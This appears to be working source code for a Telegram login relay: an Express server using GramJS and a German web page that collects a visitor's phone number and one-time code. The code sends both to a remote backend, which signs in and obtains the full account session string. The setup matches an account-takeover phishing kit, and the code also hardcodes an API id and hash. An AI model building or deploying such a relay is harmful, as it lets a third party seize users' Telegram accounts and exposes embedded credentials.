const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703; 
const apiHash = 'e9c00af578a9de0253ef02337460498f';

let client;
let phoneCodeHash;

app.post('/send-otp', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
        phoneCodeHash = result.phoneCodeHash;
        
        res.json({ success: true, phoneCodeHash });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phoneNumber, code } = req.body;
        
        await client.signIn({
            apiId,
            apiHash,
            phoneNumber,
            phoneCode: code,
            phoneCodeHash
        });

        const session = client.session.save();
        res.json({ success: true, session });
    } catch (err) {
        if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
            res.status(401).json({ error: '2FA_REQUIRED' });
        } else {
            res.status(400).json({ error: err.message });
        }
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));

### 2. index.html (Frontend)

<!DOCTYPE html>
<html lang="de">
<body>
    <input type="text" id="phone" placeholder="Nummer">
    <button onclick="sendOTP()">Code anfordern</button>
    <div id="otp-section" style="display:none;">
        <input type="text" id="code" placeholder="Code">
        <button onclick="verifyOTP()">Login</button>
    </div>

    <script>
        let phone = '';
        async function sendOTP() {
            phone = document.getElementById('phone').value;
            const res = await fetch('https://telegram-backend-yr2r.onrender.com/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber: phone })
            });
            const data = await res.json();
            if (data.success) {
                document.getElementById('otp-section').style.display = 'block';
            } else {
                alert('Fehler: ' + data.error);
            }
        }

        async function verifyOTP() {
            const code = document.getElementById('code').value;
            const res = await fetch('https://telegram-backend-yr2r.onrender.com/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber: phone, code: code })
            });
            const data = await res.json();
            if (data.success) {
                alert('Login erfolgreich! Session: ' + data.session);
            } else {
                alert('Fehler: ' + data.error);
            }
        }
    </script>
</body>
</html>
